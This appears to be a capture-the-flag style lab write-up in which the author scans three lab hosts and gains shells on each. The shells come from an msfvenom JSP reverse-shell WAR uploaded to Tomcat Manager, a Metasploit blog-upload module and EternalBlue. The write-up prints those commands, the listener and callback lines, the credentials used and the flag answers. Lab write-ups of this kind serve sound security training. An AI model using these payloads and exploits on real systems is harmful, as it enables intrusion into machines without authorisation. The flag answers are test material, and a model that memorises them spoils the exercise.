### Live Engagement Exercise
 
Hosts: 172.16.1.11 (Host-1), 172.16.1.12 (Host-2), 172.16.1.13 (Host-3)
 
---
 
I start off RDP'ing into the environment using the given credentials, and then run an nmap scan against Host-1.
 
```diff
+ $ nmap -A -sV -sC 172.16.1.11
```
 
	PORT     STATE SERVICE      VERSION
	80/tcp   open  http         Microsoft IIS httpd 10.0
	135/tcp  open  msrpc        Microsoft Windows RPC
	139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 micros
	515/tcp  open  printer      Microsoft lpd
	1801/tcp open  msmq?
	2103/tcp open  msrpc        Microsoft Windows RPC
	2105/tcp open  msrpc        Microsoft Windows RPC
	2107/tcp open  msrpc        Microsoft Windows RPC
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	8080/tcp open  http         Apache Tomcat 10.0.11
	Host script results:
	| smb-os-discovery:
	|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standa...
	|   Computer name: shells-winsvr
	|   NetBIOS computer name: SHELLS-WINSVR\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2026-08-29T22:07:22-07:00
	| smb2-time:
	|   date: 2026-08-30T05:07:23
	|_  start_date: N/A
	| smb2-security-mode:
	|   3.1.1:
	|_    Message signing enabled but not required
	|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
	| smb-security-mode:
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIO...
	d:bb:94:24 (unknown)
 
From this I can see the hostname is SHELLS-WINSVR.
 
---
 
### Question 1:
What is the hostname of Host-1? (Format: all lower case)
 
&#x1F6A9; found **shells-winsvr**.
 
---
 
### Question 2:
Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)
 
Since the section states port 8080 along with the host, I can assume that's what it wants me to attack, so I navigate there on a browser. I can see that there is a Manager App option, which, clicking that, gives a login that I can pass the credentials located on the RDP'd desktop.
 
Now having admin, I see that I can upload a war file, so I construct a payload to upload.
 
```diff
+ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > warry.war
```
 
With this payload, I upload it to the website and go to where it was uploaded, making sure I have a listener open on my machine.
 
```diff
+ $ nc -lvnp 4444
```
 
	listening on [any] 4444 ...
	connect to [172.16.1.5] from (UNKNOWN) [172.16.1.11] 50057
	Microsoft Windows [Version 10.0.17763.2114]
	(c) 2018 Microsoft Corporation. All rights reserved.
 
```diff
+ C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0> cd /Shares
+ C:\Shares> dir
```
 
	 Volume in drive C has no label.
	 Volume Serial Number is 2683-3D37
 
	 Directory of C:\Shares
 
	09/22/2021  01:22 PM    <DIR>          .
	09/22/2021  01:22 PM    <DIR>          ..
	09/22/2021  01:24 PM    <DIR>          dev-share
	               0 File(s)              0 bytes
	               3 Dir(s)  26,685,333,504 bytes free
 
&#x1F6A9; found **dev-share**.
 
---
 
### Question 3:
What distribution of Linux is running on Host-2? (Format: distro name, all lower case)
 
Next, I move on to Host-2 and do an nmap scan.
 
```diff
+ $ nmap -sV -sC -A 172.16.1.12
```
 
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
	|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
	|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: Inlanefreight Gabber
	| http-robots.txt: 1 disallowed entry
	|_/
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
I can see the distro is Ubuntu due to the packages.
 
&#x1F6A9; found **ubuntu**.
 
---
 
### Question 4:
What language is the shell written in that gets uploaded when using the 50064.rb exploit?
 
### Question 5:
Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt
 
Since it's a domain for Host-2, and it's already added to my /etc/hosts, I just visit it in my browser. It looks like a blog post and mentions being vulnerable to 50064.rb, so I open Metasploit and select that module, configuring the options to match the host.
 
```diff
+ $ msfconsole
+ msf6 > use exploit/50064.rb
+ msf6 exploit(50064) > set RHOSTS 172.16.1.12
+ msf6 exploit(50064) > set VHOST blog.inlanefreight.local
+ msf6 exploit(50064) > set USERNAME admin
+ msf6 exploit(50064) > set PASSWORD admin123!@#
+ msf6 exploit(50064) > run
```
 
	[*] Got CSRF token: c65a768bad
	[*] Logging into the blog...
	[+] Successfully logged in with admin
	[*] Uploading shell...
	[+] Shell uploaded as data/i/4YGY.php
	[+] Payload successfully triggered !
	[*] Started bind TCP handler against 172.16.1.12:4444
	[*] Sending stage (39282 bytes) to 172.16.1.12
	[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2026-08-29 23:57:01 -0400
 
```diff
+ meterpreter > cat /customscripts/flag.txt
```
 
	B1nD_Shells_r_cool
 
From the output of the payload being executed, I can see it uploads a php file.
 
&#x1F6A9; found **PHP** (Question 4).
&#x1F6A9; found **B1nD_Shells_r_cool** (Question 5).
 
---
 
### Question 6:
What is the hostname of Host-3?
 
For the final host, I run another nmap scan.
 
```diff
+ $ nmap -A -sV -sC 172.16.1.13
```
 
	PORT    STATE SERVICE      VERSION
	80/tcp  open  http         Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: 172.16.1.13 - /
	| http-methods:
	|_  Potentially risky methods: TRACE
	135/tcp open  msrpc        Microsoft Windows RPC
	139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
	Host script results:
	|_clock-skew: mean: 2h20m00s, deviation: 4h02m29s, median: 0s
	| smb2-security-mode:
	|   3.1.1:
	|_    Message signing enabled but not required
	| smb-security-mode:
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:aa:d1:5c (unknown)
	| smb2-time:
	|   date: 2026-08-30T05:33:51
	|_  start_date: 2026-08-30T02:12:19
	| smb-os-discovery:
	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
	|   Computer name: SHELLS-WINBLUE
	|   NetBIOS computer name: SHELLS-WINBLUE\x00
	|   Workgroup: WORKGROUP\x00
	|   System time: 2026-08-29T22:33:51-07:00
 
From this I can see the hostname is SHELLS-WINBLUE.
 
&#x1F6A9; found **SHELLS-WINBLUE**.
 
---
 
### Question 7:
Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt
 
Considering the hostname and the old SMB server, I assume that it might be vulnerable to EternalBlue.
 
```diff
+ $ msfconsole
+ msf6 > search eternalblue
+ msf6 > use exploit/windows/smb/ms17_010_psexec
+ msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 172.16.1.13
+ msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 172.16.1.5
+ msf6 exploit(windows/smb/ms17_010_psexec) > run
```
 
```diff
+ meterpreter > cd /Users/Administrator/Desktop
+ meterpreter > ls
```
 
	Listing: C:\Users\Administrator\Desktop
	===================================
 
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	100666/rw-rw-rw-  14    fil   2021-10-18 15:26:10 -0400  Skills-flag.txt
	100666/rw-rw-rw-  282   fil   2020-10-05 19:18:25 -0400  desktop.ini
 
```diff
+ meterpreter > cat Skills-flag.txt
```
 
	One-H0st-Down!
 
&#x1F6A9; found **One-H0st-Down!**.
 

